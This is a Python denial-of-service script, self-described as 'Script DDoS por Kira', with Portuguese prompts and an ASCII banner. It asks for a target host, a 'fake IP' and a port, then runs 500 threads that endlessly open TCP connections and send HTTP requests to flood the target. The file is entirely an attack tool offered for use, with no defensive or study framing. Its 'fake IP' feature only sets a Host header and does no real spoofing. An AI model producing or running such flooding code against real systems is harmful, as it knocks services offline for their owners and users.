import os
import socket
import threading
import time

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_animation():
    while True:
        for _ in range(5):
            print("Ataque em andamento", end="")
            time.sleep(0.2)
            clear_screen()
            time.sleep(0.2)
        time.sleep(1)

clear_screen()

print("██╗░░░░░██╗██╗░░██╗░█████╗░███████╗███████╗███████╗")
print("██║░░░░░██║██║░░██║██╔══██╗██╔════╝██╔════╝██╔════╝")
print("██║░░░░░██║███████║██║░░██║█████╗░░██████╗░██████╗░")
print("██║░░░░░██║██╔══██║██║░░██║██╔══╝░░╚════██╗╚════██╗")
print("███████╗██║██║░░██║╚█████╔╝███████╗██████╔╝██████╔╝")
print("╚══════╝╚═╝╚═╝░░╚═╝░╚════╝░╚══════╝╚═════╝░╚═════╝░")
print("                                                      ")
print("Script DDoS por Kira")

alvo = input("Digite o alvo: ")
ip_falso = input("Digite o IP falso: ")
porta = int(input("Digite a porta: "))

num_ataques = 0

def ataque():
    while True:
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((alvo, porta))

            soc.sendto(("GET /" + alvo + " HTTP/1.1\r\n").encode("ascii"), (alvo, porta))

            soc.sendto(("Host: " + ip_falso + "\r\n\r\n").encode("ascii"), (alvo, porta))

            global num_ataques
            num_ataques += 1
            print(f'\033[1;31mRequest sent successfully! (alvo: {alvo}) : {num_ataques}\033[0m')

            soc.close()
        except Exception as e:
            print(f'\033[1;31mOperation not complete! (alvo: {alvo}) : {str(e)}\033[0m')

# Iniciar a animação em uma thread separada
animation_thread = threading.Thread(target=print_animation)
animation_thread.daemon = True
animation_thread.start()

# Iniciar os ataques em threads separadas
for i in range(500):
    thread = threading.Thread(target=ataque)
    thread.start()

# Aguardar até que todas as threads terminem
for thread in threading.enumerate():
    if thread != threading.current_thread():
        thread.join()
        